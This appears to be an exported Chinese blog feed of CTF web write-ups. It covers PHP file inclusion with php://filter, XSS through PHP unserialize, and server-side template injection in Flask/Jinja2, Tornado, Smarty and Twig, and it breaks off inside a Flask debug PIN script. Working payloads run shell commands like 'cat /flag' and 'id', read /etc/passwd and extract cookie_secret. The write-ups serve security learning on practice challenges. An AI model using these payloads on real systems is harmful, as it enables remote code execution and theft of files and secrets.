operator">!==</span>  <span class="token keyword type-declaration">false</span> <span class="token operator">||</span> <span class="token class-name">strpos</span><span class="token punctuation">(</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>                                    <span class="token keyword">include</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Sorry, we currently only support woofers and meowers."</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                <span class="token delimiter important">?></span></span></code></pre><p>è¦æ±‚<code>category</code>å¿…é¡»æºå¸¦<code>woofers</code>æˆ–è€…<code>meowers</code>æ‰èƒ½è¿›è¡Œ<code>include</code>æ“ä½œï¼Œé‚£ä¹ˆåŠ ä¸Šå»å°±å¯ä»¥äº†</p><p>payloadï¼š<code>php://filter/read=convert.base64-encode/resource=woofers/../flag</code></p><p>è§£ç å¾—åˆ°flag</p><p>ç½‘ä¸Šè¿˜æœ‰ä¸€ç§è¯´æ³•å°±æ˜¯<code>php://filter</code>ä¼ªåè®®å¯ä»¥å¥—ä¸€å±‚åè®®ï¼Œä¹Ÿå°±æ˜¯è¿™æ ·</p><p><code>php://filter/read=convert.base64-encode/woofers/resource=flag</code></p><p>è¿™æ ·æäº¤çš„å‚æ•°æ—¢åŒ…å«æœ‰woofersè¿™ä¸ªå­—ç¬¦ä¸²ï¼Œä¹Ÿä¸ä¼šå½±å“æ­£å¸¸çš„åŒ…å«</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><p><a href="https://www.freebuf.com/articles/web/182280.html">Webå®‰å…¨å®æˆ˜ç³»åˆ—ï¼šæ–‡ä»¶åŒ…å«æ¼æ´</a></p></li><li><p><a href="https://www.leavesongs.com/search/?keyword=filter">è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨</a></p></li><li><p><a href="https://segmentfault.com/a/1190000018991087">PHPä¼ªåè®®æ€»ç»“</a></p></li><li><p><a href="https://www.freebuf.com/column/148886.html">phpä¼ªåè®®å®ç°å‘½ä»¤æ‰§è¡Œçš„ä¸ƒç§å§¿åŠ¿</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> å¤‡å¿˜å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-XSS</title>
      <link href="posts/fb2051a0/"/>
      <url>posts/fb2051a0/</url>
      
        <content type="html"><![CDATA[<h3 id="BJDCTF-2nd-xssä¹‹å…‰"><a href="#BJDCTF-2nd-xssä¹‹å…‰" class="headerlink" title="[BJDCTF 2nd]xssä¹‹å…‰"></a>[BJDCTF 2nd]xssä¹‹å…‰</h3><p>å­˜åœ¨<code>.git</code>æºç æ³„éœ²ï¼ŒGitHackå¾—åˆ°æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'yds_is_so_beautiful'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>ä¸¤è¡Œä»£ç ï¼Œæ ¹æ®é¢˜ç›®åæ¨æµ‹éœ€è¦å¼¹ä¸€ä¸ªXSSå¼¹çª—ï¼Œé¢˜ç›®çš„ä»£ç æ²¡æœ‰ç±»ç»™æˆ‘ä»¬æ„é€ ååºåˆ—åŒ–æ¡ä»¶ï¼Œäºæ˜¯å°±éœ€è¦åˆ©ç”¨<code>php</code>çš„åŸç”Ÿç±»æ¥è¿›è¡Œæ“ä½œ</p><p>å‚è€ƒï¼š<a href="http://blog.ydspoplar.top/2020/03/17/php%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E5%8E%9F%E7%94%9F%E7%B1%BB/">phpå¯åˆ©ç”¨çš„åŸç”Ÿç±»</a></p><p>é¢˜ç›®<code>php</code>ç‰ˆæœ¬æ˜¯<code>5.6.40</code>ï¼Œäºæ˜¯åˆ©ç”¨<code>Exception</code>ç±»æ¥è¿›è¡Œå¼¹çª—</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>window.location.href='https://www.baidu.com'&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æŠ“åŒ…è¿”å›å¤´ä¸­å°±æœ‰flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFé¢˜ </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SSTI</title>
      <link href="posts/47d18edd/"/>
      <url>posts/47d18edd/</url>
      
        <content type="html"><![CDATA[<p>å…ˆæ¬ä¸€å¼ å¤§ä½¬çš„å›¾ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200521204901527.png" alt loading="lazy"></p><span id="more"></span><h3 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h3><p>æ‰“å¼€é“¾æ¥å‘ç°å°±ä¸€ä¸ªè¿™ä¸œè¥¿</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-81.png" alt loading="lazy"></p><p>æ‡µäº†ï¼Œäºæ˜¯è´­ä¹°writeupè¿›è¡Œå­¦ä¹ ï¼š</p><p>å‘ç°è¯¥é¢˜æ˜¯ä¸€ä¸ªåˆ©ç”¨â€œPython SSTIâ€,â€œ404æ¨¡æ¿æ³¨å…¥â€çš„åŸç†</p><p>é¢˜ç›®ç±»å‹æ·±åº¦å‰–æç§»æ­¥å¤§ä½¬çš„æ–‡ç« ï¼š<a href="https://www.freebuf.com/column/187845.html">ä»é›¶å­¦ä¹ flaskæ¨¡æ¿æ³¨å…¥</a></p><p>æ–¹æ³•ï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell">åœ¨Pythonçš„SSTIä¸­ï¼Œå¤§éƒ¨åˆ†æ˜¯ä¾é åŸºç±»-&gt;å­ç±»-&gt;å±é™©å‡½æ•°çš„æ–¹å¼æ¥åˆ©ç”¨SSTI__class__  ä¸‡ç‰©çš†å¯¹è±¡ï¼Œè€Œclassç”¨äºè¿”å›è¯¥å¯¹è±¡æ‰€å±çš„ç±»ï¼Œæ¯”å¦‚æŸä¸ªå­—ç¬¦ä¸²ï¼Œä»–çš„å¯¹è±¡ä¸ºå­—ç¬¦ä¸²å¯¹è±¡ï¼Œè€Œå…¶æ‰€å±çš„ç±»ä¸º&lt;class &#39;str&#39;&gt;__mro__    è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚__base__   ä»¥å­—ç¬¦ä¸²è¿”å›ä¸€ä¸ªç±»æ‰€ç›´æ¥ç»§æ‰¿çš„ç±»ã€‚__bases__  ä»¥å…ƒç»„çš„å½¢å¼è¿”å›ä¸€ä¸ªç±»æ‰€ç›´æ¥ç»§æ‰¿çš„ç±»ã€‚&#x2F;&#x2F; __base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„__subclasses__   æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨ï¼Œè·å–ç±»çš„æ‰€æœ‰å­ç±»ã€‚__init__  ç±»çš„åˆå§‹åŒ–æ–¹æ³•ï¼Œæ‰€æœ‰è‡ªå¸¦å¸¦ç±»éƒ½åŒ…å«initæ–¹æ³•ï¼Œä¾¿äºåˆ©ç”¨ä»–å½“è·³æ¿æ¥è°ƒç”¨globalsã€‚__globals__  å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨ï¼Œç”¨äºè·å–functionæ‰€å¤„ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„moduleã€æ–¹æ³•ä»¥åŠæ‰€æœ‰å˜é‡ã€‚</code></pre><p>è§£é¢˜æ­¥éª¤ï¼š</p><p>1ã€æµ‹è¯•æ˜¯å¦å­˜åœ¨SSTIï¼š</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//111.198.29.45:46675/&#123;&#123;1+2&#125;&#125; </code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-82.png" alt loading="lazy"></p><p>äº‹å®è¯æ˜å­˜åœ¨SSTI</p><p>2ã€è®¿é—®</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//111.198.29.45:46675/&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</code></pre><p>æ¥æŸ¥çœ‹æ‰€æœ‰æ¨¡å—</p><p>3ã€osæ¨¡å—éƒ½æ˜¯ä»warnings.catch_warningsæ¨¡å—å…¥æ‰‹çš„ï¼Œåœ¨æ‰€æœ‰æ¨¡å—ä¸­æŸ¥æ‰¾catch_warningsçš„ä½ç½®ï¼Œä¸ºç¬¬59ä¸ªï¼ˆæˆ‘çœ¼çäº†ï¼Œä¸è¦é—®æˆ‘ä¸ºä»€ä¹ˆï¼‰</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-83.png" style="zoom:80%;" loading="lazy"><p>4ã€è®¿é—®</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//111.198.29.45:46675/&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()&#125;&#125;</code></pre><p>æŸ¥çœ‹catch_warningsæ¨¡å—éƒ½å­˜åœ¨å“ªäº›å…¨å±€å‡½æ•°ï¼Œå¯ä»¥æ‰¾åˆ°linecacheå‡½æ•°ï¼Œosæ¨¡å—å°±åœ¨å…¶ä¸­</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-84.png" alt loading="lazy"></p><p>5.ä½¿ç”¨<code>[&#39;o&#39;+&#39;s&#39;]</code>,å¯ç»•è¿‡å¯¹<code>os</code>å­—ç¬¦çš„è¿‡æ»¤ï¼Œè®¿é—®</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//111.198.29.45:46675/&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls").read()')&#125;&#125;</code></pre><p>æŸ¥çœ‹flagæ–‡ä»¶æ‰€åœ¨</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-85.png" alt loading="lazy"></p><p>6ã€è®¿é—®</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//111.198.29.45:46675/&#123;&#123;"".__class__.__mro__[2].__subclasses__()[40]("fl4g").read()&#125;&#125;</code></pre><p>å¯å¾—åˆ°flagï¼Œå¦‚å›¾æ‰€ç¤º</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-86.png" alt loading="lazy"></p><p><strong>writeupé‡Œçš„å¦å¤–ä¸€ç§å§¿åŠ¿ï¼š</strong></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-87.png" alt loading="lazy"></p><p><strong>å¦å¤–ï¼Œé‡Œé¢è¿˜æœ‰ä¸€ç§æ›´éªšçš„æ“ä½œï¼š</strong></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-88.png" alt loading="lazy"></p><p>è¿™é‡Œç”¨åˆ°äº†ä¸€ä¸ªå·¥å…·ï¼š<a href="https://github.com/epinna/tplmap">tplmap</a></p><p>ä¸€ä¸ªæ‰«ææœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´çš„å¼€æºå·¥å…· ï¼Œéœ€è¦è‡ªå–</p><p>é™„ä¸ŠOSæ–‡ä»¶ç›®å½•çš„æ–¹æ³•ï¼š <a href="https://www.runoob.com/python/os-file-methods.html">Python OS æ–‡ä»¶/ç›®å½•æ–¹æ³•</a></p><h3 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="BJDCTF-2nd-fake google"></a>BJDCTF-2nd-fake google</h3><p>ç•Œé¢ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200324100426394.png" alt loading="lazy"></p><p>éšä¾¿è¾“å…¥æµ‹è¯•åå¾—åˆ°ä¸€ä»¥ä¸‹ç»“æœï¼Œæ¨æµ‹æ˜¯SSTI</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200324100451322.png" alt loading="lazy"></p><p>F12æ‰“å¼€åå‘ç°æç¤ºæœç„¶æ˜¯SSTI</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200324100534466.png" alt loading="lazy"></p><p>æµ‹è¯•åå‘ç°å•¥éƒ½æ²¡è¿‡æ»¤ï¼Œäºæ˜¯ç›´æ¥ä¸Špayloadï¼š</p><p>payload1ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('cd ..;ls;cat flag').read()"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span></code></pre><p>payload2ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /flag | base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>å‘½ä»¤æ‰§è¡Œï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('id').read()"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span></code></pre><p>æ–‡ä»¶æ“ä½œï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span></code></pre><h3 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="æŠ¤ç½‘æ¯ 2018-easy_tornado"></a>æŠ¤ç½‘æ¯ 2018-easy_tornado</h3><p>é¢˜ç›®ç•Œé¢ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200412112736253.png" alt loading="lazy"></p><p>urlæ ¼å¼ï¼š<code>http://70c4e22b-ffb9-4933-b754-737df58fec82.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=766846dacf2bd89cde918d880dd30d77</code></p><p>æ ¹æ®æç¤º<code>flag</code>åœ¨<code>/fllllllllllllag</code>ä¸­ï¼Œ<code>hints</code>ä¸º<code>md5(cookie_secret+md5(filename))</code></p><p>è§‚å¯Ÿurlåæ¨æµ‹å‡ºå…¶ä¸­çš„å…³ç³»<code>filehash=md5(cookie_secret+md5(filename))</code></p><p>ä¹Ÿå°±æ˜¯è¯´<code>filename</code>æœ‰äº†ï¼Œåªéœ€è¦æ‹¿åˆ°<code>cookie_secret</code>å†ç»è¿‡<code>md5</code>æ¢ç®—åä¼ å…¥å³å¯å¾—åˆ°<code>flag</code></p><p>ä¸€ç§æ–¹æ³•ï¼Œæ ¹æ®å·²æœ‰çš„<code>filename</code>å’Œ<code>filehash</code>çˆ†ç ´å‡º<code>cookie_secret</code>å€¼ï¼Œå½“ç„¶è¿™ç§æ–¹æ³•çˆ†ç ´ä¸çŸ¥é“çˆ†ç ´åˆ°ä»€ä¹ˆæ—¶å€™å»äº†ï¼Œéšæ‰‹æµ‹è¯•åå‘ç°å½“<code>filename</code>å’Œ<code>filehash</code>ä¸å¯¹åº”çš„æ—¶å€™æœ‰ä¸€ä¸ªerroré¡µé¢</p><p>urlæ ¼å¼ï¼š<code>http://70c4e22b-ffb9-4933-b754-737df58fec82.node3.buuoj.cn/error?msg=Error</code></p><p>æµ‹è¯•<code>error?msg=&#123;&#123;1&#125;&#125;</code>å‘ç°æœ‰å›æ˜¾ï¼Œåº”è¯¥å­˜åœ¨æ¨¡æ¿æ³¨å…¥</p><p>ç™¾åº¦<code>reader</code>å‘ç°æ˜¯<code>Tornado</code>æ¡†æ¶ä¸­çš„ä¸€ä¸ªæ¸²æŸ“æ¨¡æ¿</p><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/2908">https://xz.aliyun.com/t/2908</a></p><p>é€šè¿‡<code>handler.application</code>å¯è®¿é—®æ•´ä¸ªTornado</p><p>é€šè¿‡<code>&#123;&#123;handler.application.settings&#125;&#125;</code>æˆ–è€…<code>&#123;&#123;handler.settings&#125;&#125;</code>å°±å¯è·å¾—<code>settings</code>ä¸­çš„<strong>cookie_secret</strong></p><p><code>/fllllllllllllag</code>md5åŠ å¯†ååœ¨å‰é¢åŠ ä¸Š<code>cookie_secret</code>å†ç»è¿‡md5åŠ å¯†åçš„å€¼å†å’Œ<code>/fllllllllllllag</code>ä¼ å…¥urlä¸­å³å¯å¾—åˆ°flag</p><h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="BJDCTF2020-The mystery of ip"></a>BJDCTF2020-The mystery of ip</h3><p>flag.phpç•Œé¢ä¼šå›æ˜¾ipï¼ŒæŠ“åŒ…æ”¹XFFå¤´ï¼ŒæˆåŠŸä¼ªé€ ï¼Œ</p><p>è¿™é‡Œè€ƒçš„æ˜¯smartyæ¨¡æ¿æ³¨å…¥ï¼Œ</p><p>å…³äºsmartyçš„SSTIå¯ä»¥å‚è€ƒ<a href="https://www.freebuf.com/column/219913.html">https://www.freebuf.com/column/219913.html</a></p><p>æ‹¿flagçš„payloadï¼š<code>X-Forwarded-For: &#123;&#123;system('cat /flag')&#125;&#125;</code></p><h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="BJDCTF2020-Cookie is so stable"></a>BJDCTF2020-Cookie is so stable</h3><p>é¦–å…ˆåœ¨<code>flag.php</code>ç•Œé¢è¿›è¡Œæµ‹è¯•ï¼Œ<code>&#123;&#123;7*'7'&#125;&#125;</code>ï¼Œè¿”å›49ï¼Œé‚£åº”è¯¥å°±æ˜¯<code>Twig</code>æ¨¡æ¿äº†ï¼Œç›´æ¥ç»™å‡º<code>payload</code>ï¼š</p><p><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</code></p><h3 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h3><p>ç•Œé¢ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200815223254907.png" alt loading="lazy"></p><p>å¯ä»¥çœ‹åˆ°è¿™æ ·ç•Œé¢æ‰€æ‹¥æœ‰çš„åŠŸèƒ½ï¼ŒåŠ è§£å¯†base64ï¼Œå¹¶ä¸”è¾“å…¥ä¸å½“ä¼šè§¦å‘debugæ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªdebugæ²¡å…³ï¼Œè½¬åˆ°æç¤ºç•Œé¢ï¼Œhtmlæºç ä¸­å­˜åœ¨ä¸€ä¸ªå°hint â€”&gt; <code>&lt;!-- PIN ---&gt;</code>ï¼Œä¸å‡ºæ„å¤–åº”è¯¥å°±æ˜¯è¦è·å¾—è¿™ä¸ªPINç æ¥åˆ°debugç•Œé¢è¿›è¡Œå‘½ä»¤æ‰§è¡Œæ“ä½œäº†</p><p>ç»“æœæµ‹è¯•åœ¨è§£å¯†ç•Œé¢å­˜åœ¨SSTIï¼Œæ—¢<code>&#123;&#123;7+7&#125;&#125;</code>è¾“å‡ºç»“æœ14ï¼Œäºæ˜¯å°è¯•åœ¨è¿™é‡Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œæˆ–æ–‡ä»¶è¯»å–ï¼Œfuzzåå‘ç°è¿‡æ»¤äº†æŒºå¤šä¸œè¥¿äº†ï¼Œè¯¸å¦‚<code>importã€popenã€systemã€evalã€flag</code>ç­‰å…³é”®å­—ï¼Œä½†æ˜¯å¯ä»¥è¿›è¡Œæ–‡ä»¶è¯»å–</p><p>payloadï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span></code></pre><p>base64ç¼–ç åï¼š</p><pre class="language-none"><code class="language-none">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignZmxhZy5waHAnLCAncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9</code></pre><p>ä¼ å…¥å¯ä»¥çœ‹åˆ°<code>/etc/passwd</code>çš„å†…å®¹</p><p>è¿™æ—¶æ ¹æ®é¢˜ç›®æ„æ€ï¼Œè·å–PINç </p><p>åŸç†å‚è€ƒè¿™ç¯‡åšå®¢ï¼š<a href="https://www.cnblogs.com/HacTF/p/8160076.html">Flask debug æ¨¡å¼ PIN ç ç”Ÿæˆæœºåˆ¶å®‰å…¨æ€§ç ”ç©¶ç¬”è®°</a></p><p>ä¸Šè„šæœ¬ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chainprobably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'flaskweb'</span><span class="token punctuation">,</span>     <span class="token comment"># æœåŠ¡å™¨è¿è¡Œflaskæ‰€ç™»å½•çš„ç”¨æˆ·åã€‚ é€šè¿‡/etc/passwdä¸­å¯ä»¥çŒœæµ‹ä¸ºflaskweb æˆ–è€…root ï¼Œæ­¤å¤„ç”¨çš„flaskweb</span>    <span class="token string">'flask.app'</span><span class="token punctuation">,</span>    <span class="token comment"># modname ä¸€èˆ¬ä¸å˜å°±æ˜¯flask.app</span>    <span class="token string">'Flask'</span><span class="token punctuation">,</span>        <span class="token comment"># getattr(app, "__name__", app.__class__.__name__)  pythonè¯¥å€¼ä¸€èˆ¬ä¸ºFlask å€¼ä¸€èˆ¬ä¸å˜</span>    <span class="token string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span><span class="token punctuation">,</span>   <span class="token comment"># flaskåº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„ã€‚é€šè¿‡æŠ¥é”™ä¿¡æ¯å°±ä¼šæ³„éœ²è¯¥å€¼ã€‚æœ¬é¢˜çš„å€¼ä¸º</span><span class="token punctuation">]</span>private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token comment"># å½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°ã€‚é€šè¿‡æ–‡ä»¶/sys/class/net/eth0/address è·å–: print(int('02:42:ae:00:33:f5'.replace(':', ''), 16))</span>    <span class="token string">'2485410345973'</span><span class="token punctuation">,</span>    <span class="token comment"># 